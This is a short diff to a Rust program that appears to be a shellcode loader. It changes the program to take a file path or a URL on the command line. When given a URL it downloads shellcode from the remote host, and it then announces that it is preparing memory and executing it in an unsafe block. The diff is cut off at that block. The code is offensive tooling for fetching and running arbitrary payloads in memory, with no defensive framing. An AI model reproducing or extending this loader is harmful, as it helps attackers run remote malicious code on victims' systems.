@@ -4,21 +4,42 @@ mod utils;
 use std::ptr::null_mut;
 use std::ffi::c_void;
 use std::thread;
-
+use std::env;
 
 
 fn main() {
-    // Read the shellcode from a file on disk (for testing)
-    let file_path: &str = "C:\\Users\\nullb1t3\\Desktop\\http.bin";
-    println!("[+] Reading shellcode from a file: {}", file_path);
+    
+    let args: Vec<String> = env::args().collect();
+    if args.len() < 2 {
+        println!("[!] Please provide location for the shellcode, either file path or URL");
+        return;
+    }
+    let sc_location: String = args[1].clone();
 
-    // The shellcode is read as a byte vector
-    let shellcode: Vec<u8> = match utils::read_file(file_path) {
-        Some(sc) => sc,
-        None => {
-            return
-        }
-    };
+    let mut shellcode: Vec<u8> = Vec::new();
+    if sc_location.starts_with("http") {
+
+        // Download from URL
+        println!("[+] Downloading shellcode from: {}", sc_location);
+        shellcode = utils::download_file(sc_location.as_str());
+
+    } else {
+
+        // Read the shellcode from a file on disk (for testing)
+        println!("[+] Reading shellcode from a file: {}", sc_location);
+
+        // The shellcode is read as a byte vector
+        shellcode = match utils::read_file(sc_location.as_str()) {
+            Some(sc) => sc,
+            None => {
+                return
+            }
+        };
+    }
+
+    if shellcode.is_empty() {
+        return;
+    }
 
     println!("[+] Preparing memory and executing");
     unsafe {
